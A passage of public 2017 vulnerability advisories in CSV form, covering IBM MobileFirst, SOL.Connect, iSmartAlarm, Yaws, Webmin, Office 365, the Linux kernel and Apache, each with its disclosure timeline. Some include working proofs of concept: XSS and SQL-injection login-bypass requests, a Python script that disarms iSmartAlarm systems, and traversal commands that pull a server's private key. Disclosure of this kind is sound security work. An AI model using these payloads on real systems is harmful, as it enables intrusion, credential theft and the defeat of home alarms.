======== &#9790; 1. Detailed Description &#9789; ===================================
During a Penetration Test to a mobile application it was found a
Reflected Cross-Site Scripting (XSS) vulnerability.
The mobile application was written by using an IBM security framework,
called WorkLight (or better known MobileFirst).
This vulnerability happens because the framework does not properly
validate the untrusted input in a GET parameter, present in an
authorization function exposed by RESTful Web Api.
In detail the logout functionality return a HTTP 403 Forbidden
if the value of the ""scope"" parameter is not defined in the
""authenticationConfig.xml"" and reflect it without a proper
validation in the response body.
To exploit the vulnerability simply append the payload to the
original value present in the GET parameter ""scope"".
======== &#9790; 2. Proof Of Concept &#9789; =======================================
HTTP Request
[[
GET /authorization/v1/authorization?client_id=[CLIENT_ID]
&scope=-WSAuthRealm%22%3E%3Cscript%3Ealert(1)%3C/script%3E
&isAjaxRequest=true&x=0.768018694
Host: [UNDISCLOSED]
User-Agent: [USER_AGENT]
Accept: text/html
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: JSESSIONID=[SESSION_ID]
Connection: close
]]
HTTP Response
[[
HTTP/1.1 403 Forbidden
Content-Type: text/html
Connection: Close
Date: Mon, 29 Aug 2016 16:13:37 GMT
Strict-Transport- Security: max-age=157680000
X-Expires- Orig: None
Cache-Control: max-age=0, must-revalidate, private
Content-Length: 109
Logout failed: The realm 'WSAuthRealm""><script>alert(1)</script>'
is not defined in authenticationConfig.xml.
]]
======== &#9790; 3. Solution &#9789; ===============================================
Refer to IBM Security Bulletin C1000316 for patch, upgrade or
suggested workaround information.
See ""References"" for more details.
======== &#9790; 4. Disclosure Timeline &#9789; ====================================
29/08/2016 : Discovery of the vulnerability
07/09/2016 : Vulnerability submitted to vendor
09/01/2017 : Request status update to the vendor, fix in progress
27/04/2017 : Request status update to the vendor, fix in progress
01/06/2017 : Request status update to the vendor, fix in progress
11/07/2017 : Request status update to the vendor, fix in progress
21/07/2017 : Vendor release the advisory and solution
21/07/2017 : Request CVE-ID assignment
27/07/2017 : Vendor update the advisory with CVE-ID
01/08/2017 : Public disclosure
======== &#9790; 5. Thanks & Acknowledgements &#9789; ==============================
IBM PSIRT - Product Security Incident Response Team
Emaze Networks S.p.A. - Assessment Team
======== &#9790; 6. References &#9789; =============================================
(1) http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2017-1500
(2) https://www-01.ibm.com/support/docview.wss?uid=swg2C1000316
(3) https://exchange.xforce.ibmcloud.com/vulnerabilities/129404
(4) http://cwe.mitre.org/data/definitions/79.html
(5) https://www.ibm.com/blogs/psirt/
(6) https://www.emaze.net/security-assessment/
======== &#9790; 7. Credits &#9789; ================================================
This vulnerability was discovered and reported by:
Gabriele 'matrix' Gristina (gabriele DOT gristina AT gmail DOT com)
Contacts:
https://www.linkedin.com/in/gabrielegristina
https://twitter.com/gm4tr1x
https://github.com/matrix/
======== &#9790; 8. Legal Notices &#9789; ==========================================
Copyright (c) 2017 Gabriele 'matrix' Gristina
Permission is granted for the redistribution of this alert
electronically. It may not be edited in any way without mine express
written consent. If you wish to reprint the whole or any
part of this alert in any other medium other than electronically,
please email me for permission.
Disclaimer: The information in the advisory is believed to be accurate
at the time of publishing based on currently available information.
Use of the information constitutes acceptance for use in an AS IS
condition.
There are no warranties with regard to this information. Neither the
author nor the publisher accepts any liability for any direct,
indirect, or consequential loss or damage arising from use of,
or reliance on,this information.
-----BEGIN PGP SIGNATURE-----
iQIcBAEBCgAGBQJZgZIbAAoJEI8SLzp6plg3i2IQAL81C0hxf6j8RMQ2fp6GMItZ
GhnbRucij4O0sxbhUk1Yitmd2GFPotmZYCWmhPPPUYITuQP9RNX+hIVzwEL0jsQ0
QrnovRFpZOjdkqAnC7j8+frpitDP3RE4IdcuwBuEiKPGzSY8FPwxgFYLBdAmliT3
WbRWukIDqvMHmHIp9peqb/RNFLdnH6+YNWz+d7UDcdC5I1iLdiQkmSSmB/Us/hep
er1oOtKlLZcmEYZ9GtadjAqqQRs47zBy5HNzMWiTXbUVKPMVp1WObqJu1bjHe8bl
YPamcDBk67uDa2CYaE/26amVXYYuOTyH0dm6nYbLmVsz/eyWXjP9bLlqL3NPq3QJ
tDuUWcA/XumZF5yiGNeinhkzN55+2cW5de80eZ43BV7vugLaHo+m24gU02eYhQos
8hSX90R5he9a2QsTuzt8brTaclc4rfBOdPD1RYfGgadkqQIYH7c7Qbc6eypWz9S0
CgUWODJX6dKvhKy3iAuYcdQLYJECWGwQJGN4SyULoKTK021zgaXMSlQzC/gx+gP8
EKIXQH7mkBLS+rvGNJfZ4dmZzQjAETUuQrMphPNd1sCcEoo83/kTJPx9J1Rpwa6F
R8+t+KjWL1SdIlb6m4c+Bfhwu/zcEJW/U7LI+UPmDHey7MiGBlYObp0W8N+P0aa7
hKSN1qjfcTZCvp7X/xtV
=Eubs
-----END PGP SIGNATURE-----"
1693,[CVE-2017-11494] SOL.Connect ISET-mpp meter 1.2.4.2 Authentication Bypass SQL Injection Vulnerability,,CVE-2017-11494,"Vulnerability type:
SQL injection, leading to administrative access through authentication bypass.
-----------------------------------
Product: SOL.Connect ISET-mpp meter
-----------------------------------
Affected version: SOL.Connect ISET-mpp meter 1.2.4.2 and possibly earlier
Vulnerable parameter: user
------------------------
Credit: Andy Tan
------------------------
CVE ID: CVE-2017-11494
------------------------
================
Proof of Concept
================
HTTP Request:
POST /_45b4a69e249c1d0ab9772763f3c97e69_/?s=login&o=/_45b4a69e249c1d0ab9772763f3c97e69_/%3fs%3dmain HTTP/1.1
Host: <IP-address>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: http://<IP-address>/_45b4a69e249c1d0ab9772763f3c97e69_/?s=login&o=/_45b4a69e249c1d0ab9772763f3c97e69_/%3fs%3dmain
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 131
action=submit&origin=%2F_45b4a69e249c1d0ab9772763f3c97e69_%2F%3Fs%3Dmain&s=login&user=admin%27+or+%271%27%3D%271+--%2B&password=asd
------------------------
Vendor contact timeline:
------------------------
2017-07-20: Contacted vendor. No response.
2017-07-26: Contacted vendor again. No response.
2017-08-01: Public disclosure."
1722,[CVE-2017-7728] - Authentication Bypass allows alarm's commands execution in iSmartAlarm,,CVE-2017-7728,"[+] Credits: Ilia Shnaidman
[+] @0x496c on Twitter
[+] Source:
http://dojo.bullguard.com/blog/burglar-hacker-when-a-physical-security-is-compromised-by-iot-vulnerabilities/
Vendor:
=============
iSmartAlarm, inc.
Product:
===========================
iSmartAlarm cube - All
iSmartAlarm is one of the leading IoT manufactures in the domain of smart alarm systems.
It provides a fully integrated alarm system with siren, smart cameras and locks.
It functions like any alarm system, but with the benefits of a connected device: alerts pop up on your phone,
offering you full remote control via mobile app wherever you are.
Vulnerability Type:
======================
Authentication Bypass
CVE Reference:
=============
CVE-2017-7728
Security Issue:
================
On iSmartAlarm cube devices, there is an authentication bypass.
The vulnerability can lead to remote execution of alarm's commands; setting the alarm on/off and activating the alarm siren.
Additional Information:
===============
1. First the app and the cube authenticate by using sophisticated 4 way
handshake.
Looks like that:
App ISATx01x00*3x01x00*7
Cube ISATx02x00*3x01x00*3x10x00*3 + ""Cube generated Secret Key""
2. Encryption algorithm: With the ""Secret key"" and the IPU (encryption key)
the app decrypts a key using XXTEA encryption algorithm (funny thing is that ismartalarm implementation is broken).
After that, the algorithm takes the output of the XXTEA enc and then reverses the output.
This is the ""new key""! So now, we got the encryption key, and we can do whatever we want with the alarm.
3. The app sends command as follows to proceed with the authentication:
App ISATx03x00*3x01x00*3x10x00*3 + ""new key""
Cube ISATx04x00*3x01x00*3x01x00*3x01
4. NOW WE ARE AUTHENTICATED.
we can now send one of the following commands to the cube
Disarming the alarm ""Disarm mode"":
ISATPx00*3x01x00*3x03x00*3x01x002
Arming the alarm ""Arm mode"":
ISATPx00*3x01x00*3x03x00*3x01x000
Activate alarm's siren ""Panic mode"":
ISATPx00*3x01x00*3x03x00*3x01x003
Attack Vectors:
===============
After authentication, using the above protocol will allow full control
of the alarm.
When iSmartAlarm's mobile app connected to the same network as the iSmartAlarm's cube,
their authentication and then communication are made on port tcp/12345 in PLAIN TEXT.
Obtaining encryption key is done by using CVE-2017-7726. After setting the MITM
a POST request is made to the following api:
https://api.ismartalarm.com:8443/api/GetIpuEnr.ashx
From there an attacker can obtain the encryption key.
After obtaining the encryption key, using the above protocol will allow an
attacker a full control over the alarm system.
PoC:
===============
#!/usr/bin/python
# auther: Ilia Shnaidman
# @0x496c on Twitter
# python27
import socket
import struct
# - - - - - - -
ISMART_SYN = 'ISATx01x00x00x00x01x00x00x00x00x00x00x00'
ISMART_SYN_ACK = 'ISATx02x00x00x00x01x00x00x00x10x00x00x00'
ISMART_ACK_PREFIX = 'ISATx03x00x00x00x01x00x00x00x10x00x00x00'
ISMART_SUCCESS_ACK = 'ISATx04x00x00x00x01x00x00x00x01x00x00x00x01'
ISMART_ALARM_DISARM = 'ISATPx00x00x00x01x00x00x00x03x00x00x00x01x002'
ISMART_ALARM_DISARM_ACK = 'ISATQx00x00x00x01x00x00x00x05x00x00x00x01x00200'
ISMART_ALARM_ARM = 'ISATPx00x00x00x01x00x00x00x03x00x00x00x01x000'
ISMART_ALARM_ARM_ACK = 'ISATQx00x00x00x01x00x00x00x05x00x00x00x01x00000'
ISMART_ALARM_PANIC = 'ISATPx00x00x00x01x00x00x00x03x00x00x00x01x003'
ISMART_ALARM_PANIC_ACK = 'ISATQx00x00x00x01x00x00x00x05x00x00x00x01x00300'
DELTA = 0x9e3779b9
IP = '1.2.3.4'
ISMART_PORT = 12345
# retrieve ismartalarm key using CVE-2017-7726,
# and search for /GetIpu.ashx api
ISMART_KEY = """"
MTU = 1450
# - - - - - - -
def decrypt_in_place(data,key):
#data_out = [0,0,0,0]
key_u = struct.unpack('>IIII', key)
data_u = struct.unpack('>IIII', data)
data_u = [i for i in data_u]
if len(key_u) != 4:
return None
if len(data_u) != 4:
return None
y = data_u[0]
sum = (6 + (52/4)) * DELTA
l = 4
for i in xrange(19):
e = (sum >> 2) & 3
for p in xrange(3,0,-1):
z = data_u[p-1]
y = (data_u[p] - ((((z>>5^(y<<2&0xffffffff)) + (y>>3^(z<<4&0xffffffff))) ^ (((sum^y)&0xffffffff) + (key_u[(p&3)^e]^z)))&0xffffffff))&0xffffffff
data_u[p] = y
z = data_u[l-1]
y = (data_u[0] - ((((z>>5^(y<<2&0xffffffff)) + (y>>3^(z<<4&0xffffffff))) ^ (((sum^y)&0xffffffff) + (key_u[(0&3)^e]^z)))&0xffffffff))&0xffffffff
data_u[0] = y
sum = sum - DELTA
return data_u
def revarr(arr):
n_arr = [0]*16
for i in xrange(4):
n_arr[i] = arr[3-i]
n_arr[i+4] = arr[7-i]
n_arr[i+8] = arr[11-i]
n_arr[i+12] = arr[15-i]
return """".join(n_arr)
def ismartalarm_connection():
ismart_so = socket.socket()
ismart_so.settimeout(5)
ismart_so.connect((IP, ISMART_PORT))
ismart_so.send(ISMART_SYN)
so_recv = ismart_so.recv(MTU)
if ISMART_SYN_ACK == so_recv[:16]:
ismart_secret = so_recv[16:]
key = ISMART_KEY
data_dec = decrypt_in_place(revarr(ismart_secret), revarr(key))
data_dec_rev = revarr("""".join([""{0:0{1}x}"".format(i,8) for i in data_dec]).decode(""hex""))
ismart_so.send(""%s%s"" % (ISMART_ACK_PREFIX, data_dec_rev))
so_recv = self.ismart_so.recv(MTU)
if ISMART_SUCCESS_ACK == so_recv:
# We are authenticated
return ismart_so
return False
def ismart_commands(command):
# Get authenticated connection to ismartalarm
ismart_so = ismartalarm_connection()
if not ismart_so:
# we failed to authenticate
return False
if not command:
return False
if ""arm"" is command:
print ""[+] Sending arm command""
ismart_so.send(ISMART_ALARM_ARM)
so_recv = ismart_so.recv(MTU)
if ISMART_ALARM_ARM_ACK == so_recv:
print ""[!] Success! iSmart Alarm system is ARMED!""
elif ""disarm"" is command:
print ""[+] Sending disarm command""
ismart_so.send(ISMART_ALARM_DISARM)
so_recv = ismart_so.recv(MTU)
if ISMART_ALARM_DISARM_ACK == so_recv:
print ""[!] Success! iSmartAlarm system is disarmed!""
elif ""panic"" is command:
print ""[+] Sending panic command, close your ears :)""
ismart_so.send(ISMART_ALARM_PANIC)
so_recv = ismart_so.recv(MTU)
if ISMART_ALARM_PANIC_ACK == so_recv:
print ""[!] Success! iSmartAlarm system is in panic mode!""
return True
Network Access:
===============
Remote
Severity:
=========
High
Disclosure Timeline:
=====================================
Jan 30, 2017: Initial contact to vendor
Feb 1, 2017: Vendor replied, requesting details
Feb 2, 2017: Disclosure to vendor
Apr 12, 2017: After vendor didn't replied, I've approached CERT
Apr 13, 2017: Confirmed receipt by CERT and assigning CVEs
July 05, 2017: Public disclosure"
1723,CVE-2017-7664 - Apache OpenMeetings - Missing XML Validation,,CVE-2017-7664,"Severity: High
Vendor: The Apache Software Foundation
Versions Affected: Apache OpenMeetings 3.1.0
Description: Uploaded XML documents were not correctly validated
CVE-2017-7664
The issue was fixed in 3.3.0
All users are recommended to upgrade to Apache OpenMeetings 3.3.0
Credit: This issue was identified by Security Innovation
--
WBR
Maxim aka solomax"
1727,CVE-2017-4918: Code Injection in VMware Horizon’s macOS Client,,CVE-2017-4918,"CVE-2017-4918: Code Injection in VMware Horizon’s macOS Client
Metadata
===================================================
Release Date: 10-July-2017
Author: Florian Bogner // https://bogner.sh
Affected product: VMware Horizon‘s macOS Client
Fixed in: Version 4.5
Tested on: OS X El Capitan 10.11.6
CVE: CVE-2017-4918
URL: https://bogner.sh/2017/07/cve-2017-4918-code-injection-in-vmware-horizons-macos-client/
Vulnerability Status: Fixed
Product Description
===================================================
VMware Horizon 7 is the leading platform for virtual desktops and applications.
Provide end users access to all of their virtual desktops, applications, and online services through a single digital workspace.
Vulnerability Description
===================================================
An issue within a shell script of VMware Horizon's macOS client could be abused to load arbitrary kernel extensions. In detail, this was possible because a user modifiable environment variable was used to build the command line for a highly privileged command.
Further technical details can be found on my blog: https://bogner.sh/2017/07/cve-2017-4918-code-injection-in-vmware-horizons-macos-client/
Suggested Solution
===================================================
Update to the latest version (fixed in 4.5)
Disclosure Timeline
===================================================
21-04-2017: The issues has been documented and reported
24-04-2017: VMware started investigating
06-06-2017: Fix ready
08-06-2017: Updated Horizon version 4.5 alongside security advisory VMSA-2017-0011 released
Florian Bogner
eMail: florian bogner sh
Web: http://www.bogner.sh
LinkedIn: https://www.linkedin.com/profile/view?id=368904276
Xing: https://www.xing.com/profile/Florian_Bogner9"
1736,CVE-2017-10974 Yaws Web Server v1.91 Unauthenticated Remote File Disclosure,,CVE-2017-10974,"[+] Credits: John Page aka hyp3rlinx
[+] Website: hyp3rlinx.altervista.org
[+] Source: http://hyp3rlinx.altervista.org/advisories/YAWS-WEB-SERVER-v1.91-UNAUTHENTICATED-REMOTE-FILE-DISCLOSURE.txt
[+] ISR: ApparitionSec
Vendor:
==========
yaws.hyber.org
Product:
===========
Yaws v1.91 (Yet Another Web Server)
Yaws is a HTTP high perfomance 1.1 webserver particularly well suited for dynamic-content web applications.
Two separate modes of operations are supported:
Standalone mode where Yaws runs as a regular webserver daemon. This is the default mode.
Embedded mode where Yaws runs as an embedded webserver in another Erlang application.
Vulnerability Type:
===================
Unauthenticated Remote File Disclosure
CVE Reference:
==============
CVE-2017-10974
Security Issue:
================
Remote attackers who can reach Yaws web server can read the server SSL private key file using directory
traversal attacks, access logs are also disclosed etc... this version is somewhat old, however, still avail for download
as of the time of this writing. http://yaws.hyber.org/download/
Exploit/POC:
=============
Steal Yaws Server SSL private key "".pem"" file.
curl http://REMOTE-VICTIM-IP:8080/%5C../ssl/yaws-key.pem
-----BEGIN RSA PRIVATE KEY-----
MIICWwIAAAKBgQDMJHAcJXB9TzkYg/ghXNjOAp3zcgKC4XZo4991SPGYukKVU1Fv
RX0YgPx3wz8Ae7ykPg0KW7O3D9Pn8liazTYEaXskNKAzOFr1gtBd7p937PKNQk++
3/As5EfJjz+lBrwUGbSicJgldJk3Cj89htMUqGwL2Bl/yOQIsZtyLlrP1wIDAQAB
AoGAYgEwTWLwAUjSaWGs8zJm52g8Ok7Gw+CfNzYG5oCxdBgftR693sSmjOgHzNtQ
WMQOyW7eDBYATmdr3VPsk8znHBSfQ19gAJjR89lJ6lt5qDMNtXMUWILn91g+RbkO
gmTkhD8uc0e/3FJBwPxFJWQzFEcAR4jNFJwhNzg6CO8CK/ECQQD7sNzvMRnUi1RQ
tiKgRxdjdEwNh52OUPwuJWhKdBLIpHBAJxCBHJB+1N0ufpqaEgUfJ5+gEYrBRMJh
aTCIJul5AkEAz6MsmkMz6Iej5zlKrlDL5q6GU+wElXK/F1H8tN/JchoSXN8BRCJZ
DLpK0mcMN4yukHKDCo0LD9NBlRQFDll/zwJASb2CrW2kVLpRhKgoMu9BMflDwv8G
IcqmZ9q72HxzeGd9H76SPlGhIBe7icC8CQHYkE0qnlolXgSIMsP/3RQReQJAYHnt
+INvNAUKSB6br6EFDNtcuNO6UYJufbRvmc89d5HbpGFN4k2fWMWajGarC4iHd8Bt
WNKuKB09pLoXm1JEiwJAfRtIXE6sr4MQOL6aWwGElw+Yb4B1WBhBiPRRwGTX0nzN
HXF3851+kgZBZjjzA3Ib2nr5PeXkZBBLE/4jJvRPRA==
-----END RSA PRIVATE KEY-----
--- OR Read the access logs. ---
curl http://REMOTE-VICTIM-IP:8080/%5C../logs/localhost.8080.access
<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""><HTML><HEAD><TITLE>404 Not Found</TITLE></HEAD><BODY>
<H1>Not Found</H1>The requested URL /../logs/localhost.8080.access was not found on this server.<P><HR>
<address> Yaws 1.91 Server at localhost:8080 </address> </BODY></HTML>[root@localhost ~]#
Then,
curl http://REMOTE-VICTIM-IP:8080/%5C../logs/localhost.8080.access
127.0.0.1 - - [26/Jun/2017:09:52:27 -0400] ""GET / HTTP/1.1"" 200 74419 ""-"" ""Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0""
127.0.0.1 - - [26/Jun/2017:09:52:27 -0400] ""GET /stil.css HTTP/1.1"" 200 1677 ""http://127.0.0.1:8080/"" ""Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0""
127.0.0.1 - - [26/Jun/2017:09:52:27 -0400] ""GET /icons/yaws_head.gif HTTP/1.1"" 200 2308 ""http://127.0.0.1:8080/"" ""Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0""
127.0.0.1 - - [26/Jun/2017:09:52:27 -0400] ""GET /icons/yaws_pb.gif HTTP/1.1"" 200 1444 ""http://127.0.0.1:8080/"" ""Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0""
127.0.0.1 - - [26/Jun/2017:09:52:27 -0400] ""GET /icons/yaws_y.gif HTTP/1.1"" 200 4831 ""-"" ""Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0""
127.0.0.1 - - [26/Jun/2017:09:52:33 -0400] ""GET /bindings.yaws HTTP/1.1"" 200 5502 ""http://127.0.0.1:8080/"" ""Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0""
127.0.0.1 - - [26/Jun/2017:09:52:42 -0400] ""GET /configuration.yaws HTTP/1.1"" 200 8634 ""http://127.0.0.1:8080/bindings.yaws"" ""Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0""
etc...
Network Access:
===============
Remote
Severity:
=========
High
Disclosure Timeline:
=================================
Vendor Notification: June 26, 2017
No replies
July 7, 2017 : Public Disclosure
[+] Disclaimer
The information contained within this advisory is supplied ""as-is"" with no warranties or guarantees of fitness of use or otherwise.
Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
or exploits by the author or elsewhere. All content (c).
hyp3rlinx"
1738,[SYSS-2017-011] Office 365: Insufficient Session Expiration (CWE-613),CWE-613,,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256
Advisory ID: SYSS-2017-011
Product: Office 365 (Sharepoint)
Manufacturer: Microsoft
Affected Version(s): ?
Tested Version(s): Office 365 Enterprise E3 (version from February 2017)
Vulnerability Type: Insufficient Session Expiration (CWE-613)
Risk Level: Low
Solution Status: Open
Manufacturer Notification: 2017-03-01
Solution Date:
Public Disclosure: 2017-07-04
CVE Reference: Not yet assigned
Authors of Advisory: Micha Borrmann (SySS GmbH)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Overview:
Microsoft Office 365 Enterprise E3 is a software-as-a-service (SaaS)
product that provides access to different Microsoft productivity
software (see [1]).
Due to an error in the session management, it is possible to still use
Sharepoint after the user logged out via the provided logout function.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Vulnerability Details:
SySS GmbH found out that the application is not properly invalidating
the used session cookies rtFa and FedAuth when the provided logout
function is used.
If an attacker can gain access to these two session cookies of an
authenticated user, he can still use Sharepoint in Office 365, even if
the user logged out via the logout function, the user was disabled in
the Azure AD and the license to use Office 365 was revoked for this
user, too.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Proof of Concept (PoC):
The described security issue concerning the session management of
Microsoft Office 365 Enterprise E3 could be successfully demonstrated
via an interception proxy like Burp Suite.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Solution:
The SySS GmbH found out, that deletion of the user within Azure AD
make it impossible for the user to use Office 365 anymore.
However, this is a work around and not a rock solid solution.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclosure Timeline:
2017-02-20: Detection of the vulnerability
2017-03-01: Vulnerability reported to manufacturer
2017-03-02: A ticket number for the reported case was assigned by Microsoft
2017-03-15: Microsoft informed the SySS Gmbh that the investigation of the issue is in process;
they asked for additional information about the described vulnerability
2017-03-16: SySS GmbH sent more details about the detection of the vulnerability to Microsoft
2017-03-29: Microsoft ask the SySS GmbH to confirm the vulnerability and ""We request you to not
publish any details until we confirm the resolution of this case."" (last response from Microsoft)
2017-03-31: The environment wich was used during detecting the issue was not available anymore
for the SySS GmbH; the administrator if it informed the SySS GmbH, that a new function
""enforce logout of all users"" are existing now; SySS GmbH informs Microsoft about this fact
2017-05-08: SySS GmbH asks Microsoft about the status of the reported issue
2017-06-12: SySS GmbH asks Microsoft about the status of the reported issue, if there will be no response,
the issue will be released after June 23, 2017
2017-07-04: Public release of the security advisory
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
References:
[1] Product web site for Microsoft Office 365 Enterprise E3
https://products.office.com/en-us/business/office-365-enterprise-e3-business-software
[2] SySS Security Advisory SYSS-2017-011
https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2017-011.txt
[3] SySS Responsible Disclosure Policy
https://www.syss.de/en/responsible-disclosure-policy/
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Credits:
This security vulnerability was found by Micha Borrmann of SySS GmbH.
E-Mail: micha.borrmann (at) syss.de
Public Key: https://www.syss.de/fileadmin/dokumente/PGPKeys/Micha_Borrmann.asc
Key Fingerprint: F2E7 C6A5 9950 84ED 7AD6 0DD4 EDBE 26E7 14EA 5876
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclaimer:
The information provided in this security advisory is provided ""as is""
and without warranty of any kind. Details of this security advisory may
be updated in order to provide as accurate information as possible. The
latest version of this security advisory is available on the SySS Web
site.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Copyright:
Creative Commons - Attribution (by) - Version 3.0
URL: http://creativecommons.org/licenses/by/3.0/deed.en
-----BEGIN PGP SIGNATURE-----
iQIzBAEBCAAdFiEE8ufGpZlQhO161g3U7b4m5xTqWHYFAllfU+4ACgkQ7b4m5xTq
WHZM+A//R+Bb5Y9d6m8XSVz6XZbd0usF2tskJAv4S+KIgwsAFtkgnA+xBOgHIlpx
KIy7kJDG5EnlB97fC3uYKAIrSFCFrG/rpe3vOVNtSpWC+sjN6tSmXff3gsLg+8uH
niK3Mm8qhH/dvAmvfo6l9GEBSrgQ3+1oO9ZHxZbtEHZ5avV0uwuXIlGwUFnfhO27
0AGzkcsPNji4DNKnuEhc6YiuO+ydX2V8D6Rhc8A0ToInfjCpDJGfHvPcq4tzCjj1
L9eVY2f93Ijmh5i9fRydVO/v+8Uj4jCJtM4Kg1MnPPsi9Q+wE9Y2UkI21isII/sM
cNNQhyBloE3nK9TlhgCr2gNGFHlp5G/Wjvd3C8xFGW/UUxzz2QMiZ98e5F95HC+x
Zf5ZWBaP8ofa5o+HZTLibjZ8SowqcBcdQPHsS3d9viQ9fiDEOJpZtv68d1DB8Uen
Pm/Gvr8O7Cqe9V/f3JhjV1KdLU2VnKKnb8vg1bvMimH316IgwzoLNJ9yqealFsLp
5ILOoU+abKwqcM1chTV/Q48RkRdFVZjyojq4aNK1OVorqEA6EamvPeaGwhngvIyh
e6Gmm8prd/b1Wu/oTTzMe2twPDMs/BsVOq0tkQ63IQ82wGTBjCdKakD3RzPfmp72
PL1OlAU37hsuvV4O5r4ShNsT9/W8t5WzlH+pYQj3ZSoGV5KgetM=
=hwfs
-----END PGP SIGNATURE-----"
1749,[CVE-2017-9313] Webmin 1.840 Multiple XSS Vulnerabilities,,CVE-2017-9313,"Vulnerability type: Reflected Cross Site Scripting
------------------------
Product: Webmin
------------------------
Affected version: Webmin 1.840 and possibly
earlier
------------------------
Patched version: Webmin 1.850
------------------------
Credit: Andy Tan
------------------------
CVE ID: CVE-2017-9313
------------------------
===============
Proof of Concept
================
Vulnerable Modules:
https://192.168.1.20:10000/man/view_man.cgi?page=foo&sec=<script>alert('xss')</script>
https://192.168.1.20:10000/webmin/change_referers.cgi?referer=0&referers=<script>alert('xss')</script>
https://192.168.1.20:10000/acl/save_user.cgi
(Vulnerable 'name' parameter)
Vendor contact timeline:
------------------------
2017-06-12: Contacted vendor.
2017-06-28: Vendor released new patch.
2017-07-02: Public disclosure."
1759,[CVE-2017-8831] Double-Fetch Vulnerability in Linux-4.10.1/drivers/media/pci/saa7164/saa7164-bus.c,,CVE-2017-8831,"Hi all,
I found this double-fetch vulnerability when I was doing my research on double fetch issue analysis, and I�d like to make an announcement here.
This was found in Linux kernel file Linux-4.10.1/drivers/media/pci/saa7164/saa7164-bus.c. The kernel (driver) use memcpy_fromio() to fetch twice the same block of device data from I/O memory to the kernel, and malicious data change by the peripheral device between the two fetches will cause data inconsistency for the kernel use, which will lead to consequences like array over-access on the kernel buffer.
===========================================
1. Affected Versions: Linux Kernel 4.10.1 and earlier versions.
2. Detailed description: Kernel Bugzilla: https://bugzilla.kernel.org/show_bug.cgi?id=195559
3. Patch: This has been confirmed by the maintainers and patched:
https://github.com/stoth68000/media-tree/commit/354dd3924a2e43806774953de536257548b5002c
4. CVE: The Common Vulnerabilities and Exposures (CVE) project has assigned the name CVE-2017-8831 to this issue.
Kind regards
Pengfei Wang"
1762,[CVE-2017-8813] Double-Fetch Vulnerability in Linux-4.10.1/drivers/media/pci/saa7164/saa7164-bus.c,,CVE-2017-8813,"Hi all,
I found this double-fetch vulnerability when I was doing my research on double fetch issue analysis, and I&#146;�d like to make an announcement here.
This was found in Linux kernel file Linux-4.10.1/drivers/media/pci/saa7164/saa7164-bus.c. The kernel (driver) use memcpy_fromio() to fetch twice the same block of device data from I/O memory to the kernel, and malicious data change by the peripheral device between the two fetches will cause data inconsistency for the kernel use, which will lead to consequences like array over-access on the kernel buffer.
===========================================
1. Affected Versions: Linux Kernel 4.10.1 and earlier versions.
2. Detailed description at Kernel Bugzilla: https://bugzilla.kernel.org/show_bug.cgi?id=195559
3. Patch: This has been confirmed by the maintainers and patched:
https://github.com/stoth68000/media-tree/commit/354dd3924a2e43806774953de536257548b5002c
4. CVE: The Common Vulnerabilities and Exposures (CVE) project has assigned the name CVE-2017-8813 to this issue.
Kind regards
Pengfei Wang"
1769,CVE-2017-3167: Apache httpd 2.x ap_get_basic_auth_pw authentication bypass,,CVE-2017-3167,"CVE-2017-3167: ap_get_basic_auth_pw authentication bypass
Severity: Important
Vendor: The Apache Software Foundation
Versions Affected:
httpd 2.2.0 to 2.2.32
httpd 2.4.0 to 2.4.25
Description:
Use of the ap_get_basic_auth_pw() by third-party modules outside of the
authentication phase may lead to authentication requirements being
bypassed.
Mitigation:
2.2.x users should either apply the patch available at
https://www.apache.org/dist/httpd/patches/apply_to_2.2.32/CVE-2017-3167.patch
or upgrade in the future to 2.2.33, which is currently unreleased.
2.4.x users should upgrade to 2.4.26.
Third-party module writers SHOULD use ap_get_basic_auth_components(),
